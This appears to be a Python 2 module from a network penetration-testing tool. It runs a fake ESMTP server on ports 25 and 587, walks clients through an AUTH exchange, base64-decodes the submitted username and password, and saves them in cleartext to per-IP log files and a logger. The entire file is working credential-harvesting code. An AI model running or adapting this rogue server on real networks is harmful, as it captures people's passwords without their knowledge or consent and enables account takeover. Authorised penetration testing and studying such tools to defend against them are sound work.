##################################################################################
#ESMTP Stuff starts here
##################################################################################

class SMTP():

	def serve_thread_tcp(self, host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	#Function name self-explanatory
	def start(self, SMTP_On_Off):
		if SMTP_On_Off == "ON":
			t1 = threading.Thread(name="ESMTP-25", target=self.serve_thread_tcp, args=("0.0.0.0", 25,ESMTP))
			t2 = threading.Thread(name="ESMTP-587", target=self.serve_thread_tcp, args=("0.0.0.0", 587,ESMTP))
			
			for t in [t1, t2]:
				t.setDaemon(True)
				t.start()

		if SMTP_On_Off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

#ESMTP server class.
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreating()))
			data = self.request.recv(1024)
			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)
			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				if data:
					Username = b64decode(data[:len(data)-2])
					self.request.send(str(SMTPAUTH2()))
					data = self.request.recv(1024)
					if data:
						Password = b64decode(data[:len(data)-2])
						Outfile = "./logs/responder/SMTP-Clear-Text-Password-"+self.client_address[0]+".txt"
						WriteData(Outfile,Username+":"+Password, Username+":"+Password)
						#print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
						responder_logger.info("[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))

		except Exception:
			pass

##################################################################################
#ESMTP Stuff ends here
##################################################################################